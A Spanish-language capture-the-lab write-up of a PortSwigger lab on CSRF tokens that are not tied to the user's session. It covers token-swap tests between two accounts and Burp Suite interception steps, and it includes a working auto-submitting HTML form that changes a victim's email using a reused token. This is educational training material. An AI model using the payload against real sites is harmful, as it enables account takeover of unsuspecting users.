# PortSwigger Lab: CSRF where token is not tied to user session

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-F%C3%A1cil-yellow)
![Tipo](https://img.shields.io/badge/Tipo-CSRF%20Token%20Reuse-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF con tokens no ligados a sesión.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- Token reuse across sessions
- Session-independent tokens
- Burp Suite token interception
- Token exchange validation

## Flujo resumido

```
Login en 2 cuentas (wiener + carlos)
→ Capturar tokens CSRF de ambas
→ Intercambiar tokens entre sesiones → Funciona
→ Descubrir: tokens NO ligados a sesión
→ Capturar token válido sin enviar
→ Crear payload con token reutilizable
→ Desplegar en exploit server
→ Enviar a víctima
→ Email cambiado
```

## Vulnerabilidad clave

El servidor genera tokens CSRF válidos pero **NO los vincula a la sesión del usuario**. Esto significa:

- Un token de wiener funciona en sesión de carlos
- Un token de carlos funciona en sesión de wiener
- Cualquier token válido capturado es reutilizable en cualquier sesión
- El servidor solo valida "¿existe este token?" no "¿pertenece a esta sesión?"

## Payload

```html
<html>
  <body>
    <iframe style="display:none" name="csrfframe"></iframe>
    <form method="POST" 
          action="https://target.com/my-account/change-email" 
          id="csrfform" 
          target="csrfframe">
      <input type="hidden" name="email" value="attacker@attacker.com" />
      <input type="hidden" name="csrf" value="VALID_TOKEN_CAPTURED" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Puntos clave:**

- `csrf` = token válido capturado (puede ser de cualquier sesión)
- `email` = email malicioso (debe ser único)
- Token no necesita ser enviado al servidor antes — se captura sin enviar

## Pruebas realizadas

| Prueba | Resultado |
|--------|-----------|
| Token de carlos en sesión de wiener | ✅ Funciona |
| Token de wiener en sesión de carlos | ✅ Funciona |
| Intercambiar tokens entre cuentas | ✅ Email se cambia |
| Token reutilizable en payload | ✅ CSRF exitoso |

## Diferencia con labs anteriores

| Lab 1 | Lab 2 | Lab 3 |
|-------|-------|-------|
| Sin token | Token condicional | Token global |
| Sin validación | Validación si existe | Validación siempre |
| N/A | Eliminar parámetro | **Reutilizar token** |

## Proceso de intercepción

1. Sesión iniciada en `/my-account`
2. Interceptar con Burp Suite
3. Cambiar email **sin enviar** (pausar intercepción)
4. Copiar token del body
5. **Drop** la petición
6. Token capturado es válido pero no procesado

## Implicaciones

- Tokens son validación débil si no están ligados a sesión
- Reutilización de tokens facilita CSRF
- Falsa sensación de seguridad (parece haber defensa)
- Cualquier token válido = acceso CSRF

## Referencias

- [PortSwigger — CSRF tokens](https://portswigger.net/web-security/csrf#tokens)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger Academy](https://portswigger.net/web-security/lab)
